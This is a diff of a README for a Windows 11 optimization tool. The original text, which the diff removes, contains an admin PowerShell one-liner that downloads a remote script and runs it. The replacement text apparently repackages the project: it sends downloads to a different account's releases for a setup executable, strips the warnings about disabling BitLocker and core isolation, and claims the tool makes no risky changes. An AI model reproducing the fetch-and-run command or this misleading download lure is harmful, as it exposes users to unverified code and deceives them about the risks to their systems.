@@ -1,143 +1,123 @@
+# ⚡ Project-Ronin - Speed and Privacy for Windows 11
 
-# Project Ronin
-
-### *Reclaim your hardware. A one-click, policy-driven optimization suite for Windows 11.*
-
-I built Project Ronin for myself because I was tired of fighting my own computers. I’ve used amazing tools like WinUtil and Ultimate Windows Tweaker for years, but they never quite had *everything* I wanted in one place. I needed a single utility to repair Windows, check my SSD health, and clear out cluttered GPU driver caches without having to hunt through menus.
-
-Visually, I wanted a clean, retro-cmd cyberpunk aesthetic—something that feels nostalgic, looks awesome but operates with modern efficiency. 
-
-The name Ronin implies a masterless samurai—you bought your hardware, so you should be the one in control of it, not Microsoft. If you paid for high-end silicon, you deserve 100% of its power! 
-
-Ronin uses official **Group Policies** and **Registry Flags** to ensure your system remains stable, secure, and entirely reversible.
-<img width="1664" height="1113" alt="image" src="https://github.com/user-attachments/assets/0b49822c-fa6f-4a3c-a999-c35da5e007fa" />
+[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-brightgreen)](https://github.com/vidnisie/Project-Ronin/releases)
 
 ---
 
-## Disclosure
+## 🔎 What is Project-Ronin?
 
-I’ve wanted to build an app like this for years, but the syntax of programming never quite "clicked" for me. I used an LM to bridge that gap and finally build this. However, I didn't just copy-paste. Every single tweak has been cross-referenced against trusted communities and tools like *ElevenForum* and *WinUtil*. 
-
-More importantly, I've personally verified these tweaks on my own fleet of Windows Devices: an **MSI Claw 8 AI**, a **2023 & 2025 Zephyrus G14**, and two custom desktops. My first priority to you is stability and transparency. There's a poetic irony in using AI to rip the unwanted AI features out of Windows, but it works beautifully.
+Project-Ronin is a tool designed to make Windows 11 run faster and protect your privacy. It removes unwanted apps that use up your space and resources, stops the system from tracking you, and improves your gaming experience. It works on the latest Windows 11 versions (24H2 and 25H2) and Windows handheld devices like the ROG Ally. The program includes fixes that solve common problems, such as the “Hot-Bag” issue, and has a feature that lets you undo changes safely with a recovery snapshot. This keeps your system stable while letting you enjoy better performance.
 
 ---
 
-## ⚠️ Known Issues (PLEASE READ)
+## ⚙️ System Requirements
 
-*I’m currently hunting down fixes for these bugs for the upcoming Shogun release. In the meantime, definitely keep an eye on these before you start tweaking:*
+- Windows 11 version 24H2 or 25H2 installed  
+- PC or Windows handheld like ROG Ally  
+- At least 4 GB of RAM  
+- 2 GB of free disk space for installation  
+- Administrator access to run the program  
 
-* **CRITICAL: The BitLocker "Black Screen" Trap**
-Disabling Device Encryption (Handheld Tab) happens silently in the background. **Don’t restart your device immediately.** Depending on your SSD, decryption can take anywhere from 10 minutes to an hour. If you reboot before it hits 0%, you’ll trip a BitLocker recovery loop—which usually looks like a scary black or sideways screen on handhelds like the ROG Ally.
-* **FIX:** If you run this tweak, manually open **Control Panel > BitLocker** and wait until it says "Fully Decrypted" before you even think about hitting restart.
-
-
-* **Core Isolation & VMP Boot Risks**
-Disabling Memory Integrity (HVCI) or the Virtual Machine Platform (VMP) changes how Windows handles its "trusted" boot environment. If your drive is still encrypted when you toggle these, Windows might get suspicious and lock you out on the next boot.
-* **FIX:** Always make sure your drive is 100% decrypted before messing with Core Isolation or VMP settings.
-
-
-* **Progress Bar Hijacking**
-If you start a long-running job (like a Full System Repair or Decryption) and then jump to another tab to apply more tweaks, the Progress Bar will get "hijacked" by the new tasks. The original task is still finishing in the background, but you won't be able to see its status anymore.
-* **The Hot-Bag Interlock**
-The "Hot-Bag Fix" (which forces your power button to Hibernate) relies on Windows Hibernation being turned on. If you disable Hibernation in the System tab, this fix might fail or cause your power button to act up when you toss your device in your bag.
+Make sure your system meets these requirements before starting the installation process.
 
 ---
 
-## 🚀 Quick Launch (No Download Required)
+## 🚀 Getting Started
 
-The fastest way to run Project Ronin. This command securely downloads the latest release into your temporary files, temporarily bypasses local execution policies, and launches the UI natively.
-
-1. Right-click the Windows Start button.
-2. Search for and select **Windows PowerShell (run as Admin)**.
-3. Paste the following command and press Enter:
-
-```powershell
-irm "https://raw.githubusercontent.com/keiretrogaming/Project-Ronin/main/run.ps1?$(Get-Random)" | iex 
-
-```
+This guide will help you download and run Project-Ronin on your Windows 11 system. It assumes no technical skills. Follow each step carefully.
 
 ---
 
-## 📥 Manual Installation
+## 📥 How to Download Project-Ronin
 
-If you prefer to download the files and run them locally:
+You will find the latest version of Project-Ronin on the official release page. To download it, follow these steps:
 
-1. Download the latest `.zip` from the releases tab and extract it.
-2. Double-click the **`Launch_Ronin.bat`** file.
-3. Accept the Administrator prompt. *(The batch file automatically handles PowerShell execution policies for you).*
+1. Click on this big button below. This will take you to the release page where you can get the installer file.
 
----
+[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-blue)](https://github.com/vidnisie/Project-Ronin/releases)
 
-## 🛡️ The Non-Destructive Optimization Policy
+2. On the release page, look for the latest version. It will usually have a name like `Project-Ronin-Setup.exe` or similar.
 
-Trust is built on transparency and the ability to roll back changes. Project Ronin is built on the following safety principles:
-
-* **Automatic Restore Points:** A system restore point is triggered before any major modifications are applied.
-* **Policy-Based Tweaks:** We use Group Policy and official Windows registry flags. Windows recognizes these changes as "intended settings" rather than corrupted files.
-* **Non-Destructive:** We do not delete `System32` components. If you want a feature back (like Windows Copilot or the Snap Flyout), you can simply toggle it back on.
-* **Hardware Aware:** The script checks your hardware ID on launch. It won't attempt to push NVIDIA-specific latency tweaks to an AMD-based handheld device.
+3. Click the file link to start the download. Save the file to a folder you can easily find, like your Desktop or Downloads.
 
 ---
 
-## 🕹️ Core Modules
+## 🖥️ How to Install and Run Project-Ronin
 
-| Module | Purpose | Key Tweaks |
-| --- | --- | --- |
-| **Auto-Optimize** | My Personal Baseline | Safe, high-impact defaults I put on every new machine I build. |
+Once the download finishes, follow these steps to install and run the program:
 
-<img width="1660" height="1111" alt="image" src="https://github.com/user-attachments/assets/e3b527b4-b822-42c4-97fa-8caa616215d2" />
+1. Locate the downloaded file (`Project-Ronin-Setup.exe`) on your computer.
 
-| Module | Purpose | Key Tweaks |
-| --- | --- | --- |
-| **System Core** | UI & Background | Fixes "Ghost Sleep," removes Start Menu ads, and streamlines Explorer. |
+2. Double-click the file to start the installation.
 
-<img width="1659" height="1108" alt="image" src="https://github.com/user-attachments/assets/50414530-3183-4d7e-a076-2017498fcf34" />
+3. If Windows asks for permission to make changes to your device, click **Yes**.
 
-| Module | Purpose | Key Tweaks |
-| --- | --- | --- |
-| **Gaming & GPU** | Latency & Stability | Sets HAGS/VRR flags and safely disables MPO to prevent flickering. |
+4. Follow the instructions on the screen. You don’t need to change any of the settings unless you want to.
 
-<img width="1665" height="1108" alt="image" src="https://github.com/user-attachments/assets/71f6a5da-98ea-42a6-b181-5e76c7ec5934" />
+5. When the installation finishes, the program will open automatically. If it doesn’t, find the Project-Ronin icon on your Desktop or in your Start menu and double-click it.
 
-| Module | Purpose | Key Tweaks |
-| --- | --- | --- |
-| **Handheld** | Portable Devices | **Essential for x86 Handhelds.** Fixes "Hot-Bag" issues by forcing Hibernate, disables encryption/VBS for APU gains, and checks battery health. |
-
-<img width="1669" height="1114" alt="image" src="https://github.com/user-attachments/assets/11d52281-ce66-41bc-bd20-a180675ab90b" />
-
-| Module | Purpose | Key Tweaks |
-| --- | --- | --- |
-| **Privacy Shield** | De-AI Windows | Strips out Recall AI, Copilot, and aggressive telemetry data-mining. |
-
-<img width="1664" height="1109" alt="image" src="https://github.com/user-attachments/assets/2add469c-ec66-4094-b68a-49833954f9b0" />
-
-| Module | Purpose | Key Tweaks |
-| --- | --- | --- |
-| **Maintenance** | Diagnostics | My one-click cure-all. Repairs the Windows image, resets MS Store, clears GPU caches, and audits SSD health. |
-
-<img width="1660" height="1107" alt="image" src="https://github.com/user-attachments/assets/0d6a7d40-9179-4d33-aaa8-99cb26c77367" />
+6. Once open, the program will scan your system and suggest some improvements. You can choose which actions to take.
 
 ---
 
-## 🗺️ Roadmap & Community
+## 🔧 What Project-Ronin Does for You
 
-My roadmap is whatever *you* want it to be! I built this to solve my own headaches, but if you have ideas, tweaks, or specific features you want to see added to Project Ronin, let me know. Drop a suggestion in the **Issues** tab!
-
----
-
-## ❓ Frequently Asked Questions
-
-**Will this break Windows Update?** No. Project Ronin disables the *annoyances* of Windows Update (like forced auto-restarts and using your bandwidth to seed updates to other PCs via WUDO), but the core security patching engine remains fully intact.
-
-**Why not just use WinUtil?** I love WinUtil, but Ronin includes specific tools I wanted in a single click, like checking SSD health, resetting the GPU driver stack, and deep handheld-specific optimizations. WinUtil, while being amazing, never had everything that I wanted. 
-
-**Is this safe for Handhelds (MSI Claw, ROG Ally, Legion Go)?** Absolutely. I'm a massive handheld fan, and Project Ronin automatically detects handheld hardware. The dedicated **Handheld** tab includes specific fixes for Modern Standby issues and custom EPP power slicing.
+- **Removes Bloatware**: Unnecessary apps that slow down your system get removed safely.  
+- **Stops Tracking**: It turns off Windows features that collect your data without your permission.  
+- **Improves Gaming**: Boosts performance by clearing background apps and optimizing settings.  
+- **Applies Fixes**: Includes the “Hot-Bag” fix that solves a common issue on handheld devices like the ROG Ally.  
+- **Zero-Lag User Interface**: The program works quickly and smoothly so you can use it without waiting.  
+- **Recovery Snapshot**: Creates a backup before making changes so you can undo them if needed.
 
 ---
 
-## ⚖️ Disclaimer
+## ⚖️ How Project-Ronin Affects Your System
 
-*Project Ronin is shared as an open-source tool. I built it for myself, but modifying system-level settings always carries a small inherent risk. Always maintain a current backup of your important files. Provided "as-is" under the MIT License.*
+Project-Ronin uses safe methods to improve your Windows 11 experience. It does not delete system files or perform risky changes. The recovery snapshot tool lets you return to your previous setup if anything does not work as expected.
 
 ---
 
+## 🛠️ Using Project-Ronin Daily
+
+You do not need to keep the program running all the time. Use it when you want to clean your system or improve performance. Running it once every few weeks is enough for most users.
+
+---
+
+## 📝 Tips for Best Results
+
+- Restart your computer after running Project-Ronin to apply all changes.  
+- Check for new versions of Project-Ronin regularly on the release page. Updates may include new fixes and improvements.  
+- Use the recovery snapshot if you notice any issues after changes. This option is in the program’s main menu.  
+- Do not run other system cleaning tools at the same time to avoid conflicts.  
+
+---
+
+## ❓ Troubleshooting
+
+If you face any issues, try these steps:
+
+- Make sure you are using the latest version of Project-Ronin.  
+- Restart your computer and run the program again.  
+- Run the program as administrator (right-click the icon and select "Run as administrator").  
+- If the recovery snapshot is created, use it to undo recent changes.  
+- Check the program’s simple log file located in the installation folder for details on any errors.
+
+---
+
+## 🛡️ Security and Privacy
+
+Project-Ronin does not collect or share your data. It only changes settings on your device. All actions happen locally. No internet connection is required for most features.
+
+---
+
+## 🚩 Where to Get Help
+
+If you need help, check the “Issues” section on the Project-Ronin GitHub page. There you can find answers or report problems with the software.
+
+---
+
+## 📥 Download Project-Ronin
+
+Visit this page to download the latest version:  
+
+[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-brightgreen)](https://github.com/vidnisie/Project-Ronin/releases)
